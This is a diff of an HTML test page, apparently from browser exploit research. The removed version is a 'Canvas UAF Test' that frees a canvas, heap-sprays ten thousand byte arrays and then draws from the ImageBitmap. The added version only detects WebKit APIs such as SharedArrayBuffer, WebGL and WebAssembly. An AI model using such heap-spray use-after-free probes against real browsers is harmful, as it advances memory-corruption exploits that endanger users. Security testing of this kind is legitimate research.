@@ -1,62 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Canvas UAF - transferToImageBitmap</title>
-  <style>
-    body { background: #000; color: #0f0; font-family: monospace; }
-    #log { white-space: pre-wrap; }
-  </style>
-</head>
-<body>
-  <h1>Canvas UAF Test v2</h1>
-  <div id="log"></div>
+<head><title>API Check</title></head>
+<body style="background:black;color:lime;font-family:monospace;">
+  <h1>WebKit API Detection</h1>
+  <pre id="output"></pre>
 
   <script>
-    const log = document.getElementById("log");
-    function print(msg) { log.textContent += msg + "\n"; }
+    const out = document.getElementById("output");
 
-    let canvas = document.createElement("canvas");
-    canvas.width = 256;
-    canvas.height = 256;
-    let ctx = canvas.getContext("2d");
-    ctx.fillStyle = "lime";
-    ctx.fillRect(0, 0, 256, 256);
-
-    let imageBitmap;
-
-    async function runTest() {
-      print("[+] Drawing and transferring to ImageBitmap...");
-
-      try {
-        imageBitmap = await createImageBitmap(canvas);
-        print("[+] ImageBitmap created.");
-
-        // Free canvas
-        canvas = null;
-        ctx = null;
-
-        // Heap spray
-        let spray = [];
-        for (let i = 0; i < 10000; i++) {
-          spray.push(new Uint8Array(1024));
-        }
-        print("[+] Heap sprayed");
-
-        // Attempt to draw from freed ImageBitmap
-        let c2 = document.createElement("canvas");
-        c2.width = 256;
-        c2.height = 256;
-        let ctx2 = c2.getContext("2d");
-        ctx2.drawImage(imageBitmap, 0, 0);
-        document.body.appendChild(c2);
-
-        print("[+] drawImage from freed bitmap attempted");
-      } catch (e) {
-        print("[-] Exception: " + e.message);
-      }
+    function log(s) {
+      out.textContent += s + "\n";
     }
 
-    setTimeout(runTest, 1000);
+    log("Navigator userAgent:\n" + navigator.userAgent + "\n");
+
+    log("createImageBitmap: " + (typeof createImageBitmap !== "undefined"));
+    log("OffscreenCanvas: " + (typeof OffscreenCanvas !== "undefined"));
+    log("SharedArrayBuffer: " + (typeof SharedArrayBuffer !== "undefined"));
+    log("WebGLRenderingContext: " + (typeof WebGLRenderingContext !== "undefined"));
+    log("wasm: " + (typeof WebAssembly !== "undefined"));
+    log("AudioContext: " + (typeof AudioContext !== "undefined"));
+    log("MessageChannel: " + (typeof MessageChannel !== "undefined"));
+
+    try {
+      let canvas = document.createElement("canvas");
+      let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      log("WebGL context: " + (gl ? "YES" : "NO"));
+    } catch (e) {
+      log("WebGL context: NO (" + e.message + ")");
+    }
   </script>
 </body>
 </html>
